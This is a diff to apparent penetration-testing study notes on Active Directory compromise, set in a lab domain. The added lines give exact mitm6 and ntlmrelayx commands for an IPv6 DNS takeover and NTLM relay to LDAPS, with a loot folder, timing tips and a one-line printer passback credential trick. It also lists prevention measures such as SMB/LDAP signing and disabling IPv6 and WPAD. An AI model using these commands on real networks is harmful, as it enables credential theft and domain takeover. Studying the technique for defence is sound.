@@ -29,5 +29,14 @@ Phase4: Privilege escalation & domain compromise:
 if relayed user is domain admin - new user account is auto created by ntlmrelay  
 can abuse default AD configurations to create machine account and modify machine account to impersonate other users  
 
+**Attack**:  
+ntlmrelayx.py -6 –t ldaps://192.x.x.x -wh fakewpad.marvel.local -l lootme     //start this first    
+check lootme folder for all collected data  //ip is that of AD ldap server //  
+sudo mitm6 –d marvel.local    //next run this, serves ipv6 responses for that domain  
 
+Don’t run for more than 10 mins and use on local domain as it causes problems !!  
+trigger an event such as system reboot or somebody login !!  
 
+Prevention: SMB/LDAP signing, disable ipv6 and dhcp6 traffic, disable wpad  
+
+**Passback attacks**: printer ldap creds stored, change ip to kali - tcpdump   
